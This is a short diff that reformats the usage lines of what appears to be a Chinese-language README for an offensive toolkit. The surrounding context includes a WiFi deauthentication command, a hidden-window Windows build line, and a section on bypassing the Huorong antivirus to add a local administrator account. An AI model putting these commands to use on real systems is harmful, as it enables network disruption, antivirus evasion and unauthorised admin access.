@@ -9,7 +9,8 @@
 <code>aireplay-ng -0 <int类型> -a 1C:FF:59:33:7F:FF(AP) --ignore-negative-one -D wlan0</code><br>
 如果要注释 那么请<code>cat 0.txt</code><br>
 ### 2.py
-用法 <code>python3 2.py <IP地址></code><br>
+用法<br> 
+<code>python3 2.py <IP地址></code><br>
 请到<code>maxmind</code>下载<code>GeoLite2-City.mmdb</code>后运行
 ### metadata of movie or picture
 用法 <code>python3 1.py</code><br>
@@ -42,7 +43,7 @@ local ethernet address && gateway ipv4 address<br>
 <code>g++ 0.cpp -o 00 -lws2_32 -s -O2 -static -static-libgcc -static-libstdc++ -mwindows</code>
 需要修改0.cpp中的RyzU1
 ### bypass huorong add user account 
-##用法<br>
+用法<br>
 <code>x86_64-w64-mingw32-g++ -o 001 1.cpp -lnetapi32 -static -static-libgcc -static-libstdc++</code><br>
 <code>001.exe</code><br>
 <code>net localgroup administrators DSzOO3vnAu /add</code><br>
